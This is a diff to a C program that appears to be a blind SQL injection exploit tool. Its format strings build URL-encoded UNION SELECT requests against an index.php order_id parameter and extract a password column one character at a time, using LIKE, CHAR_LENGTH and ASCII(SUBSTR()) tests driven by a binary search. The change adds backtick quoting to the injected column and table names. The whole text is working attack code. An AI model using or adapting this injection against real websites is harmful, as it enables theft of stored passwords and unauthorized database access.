@@ -292,16 +292,16 @@ bool check_password(const void *ctx) {
         "GET /index.php?order_id=0%%20UNION%%20SELECT%%20"
         "%s" // SELECT `pwd_col`
         "%%20FROM%%20"
-        "%s%%20" // FROM `table_name`
+        "%%60%s%%60%%20" // FROM `table_name`
         "WHERE%%20"
-        "%s" // WHERE `id_col`
+        "%%60%s%%60" // WHERE `id_col`
         "%%3d322695107%%20"
         "AND%%20"
-        "%s%%20" // AND `pwd_col`...
+        "%%60%s%%60%%20" // AND `pwd_col`...
         "LIKE%%20%%27%s%%25%%27%%20" // ...LIKE 'discovered%'
-        "AND%%20CHAR_LENGTH(%s)>%i%%20" // CHAR_LENGTH(pwd_col) > size(discovered)
+        "AND%%20CHAR_LENGTH(%%60%s%%60)>%i%%20" // CHAR_LENGTH(pwd_col) > size(discovered)
         "AND%%20ASCII(SUBSTR("
-        "%s" // SUBSTR(`pwd_col`...)
+        "%%60%s%%60" // SUBSTR(`pwd_col`...)
         ",%i,1))<%%3dASCII(%%22%s%%22)%%20"
         "LIMIT%%201;"
         " HTTP/1.1\r\n"
@@ -512,7 +512,7 @@ void binary_search(compare_func_t compare_fn, void *ctx) {
             count++;
         #endif
             gen_ctx->index = i;
-            gen_ctx->guess = url_map_single_quote[mid];
+            gen_ctx->guess = url_map_single_quote[mid]; // the character we check is going to be used inside single quotes in the query
             if (compare_fn(ctx)) {
                 high=mid;
             } else {
